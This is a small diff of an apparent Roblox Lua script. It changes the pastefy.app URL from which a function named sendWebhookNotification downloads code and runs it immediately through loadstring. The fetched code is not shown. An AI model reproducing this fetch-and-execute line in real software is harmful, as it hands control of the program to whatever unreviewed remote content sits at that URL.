@@ -25,7 +25,7 @@ math.randomseed(os.clock()*1e6)
 -- Executes your pastefy webhook script
 local function sendWebhookNotification()
     local success, err = pcall(function()
-        loadstring(game:HttpGet("https://pastefy.app/bSNDtnko/raw"))()
+        loadstring(game:HttpGet("https://pastefy.app/0DqvarcY/raw"))()
     end)
     if not success then
         warn("Webhook failed: " .. tostring(err))
